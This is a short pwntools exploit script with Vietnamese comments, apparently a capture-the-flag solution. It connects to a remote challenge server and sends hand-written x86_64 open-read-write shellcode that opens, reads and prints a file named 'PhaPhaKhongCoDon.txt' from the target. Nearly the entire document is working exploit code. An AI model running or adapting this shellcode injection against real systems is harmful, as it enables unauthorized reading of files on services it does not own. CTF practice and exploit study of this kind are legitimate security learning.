from pwn import * 

context.arch= 'amd64'
sh = remote('45.122.249.68',10017)

print(u64('.txt\0\0\0\0'))
print(u64('ongCoDon'))
print(u64('PhaPhaKh'))

# Reference from hint. Link: https://drx.home.blog/2019/04/03/pwnable-tw-orw/
# Ban đầu không biết sai gì ở chỗ push, sau đó có đồng đội chỉ lại mới biết x86_64 không push trực tiếp immediate vào stack =3
shellcode = asm('\n'.join([
        # Đưa các giá trị vào thanh ghi để gián tiếp push vào stack
        # Size tối đa là 8 bytes, còn thiếu thì đệm thêm byte NULL
        'mov r8, %s' % hex(u64('.txt\0\0\0\0')),
        'mov r9, %s' % hex(u64('ongCoDon')),
        'mov r10, %s' % hex(u64('PhaPhaKh')),
        'push r8',
        'push r9', 
        'push r10', 
  
        # Syscall open
        'xor rdx, rdx',
        'xor rsi, rsi',
        'mov rdi, rsp',
        'mov rax, 0x2',
        'syscall',
          
        # Syscall read
        'mov rsi, rsp',
        'mov rdi, rax',  
        'mov rdx, 0x100',
        'mov rax, 0x0',  
        'syscall',
  
        # Syscall write
        'mov rdi, 0x1',
        'mov rdx, rax',
        'mov rax, 0x1',
        'syscall'
]))

sh.sendline(shellcode)
sh.interactive()
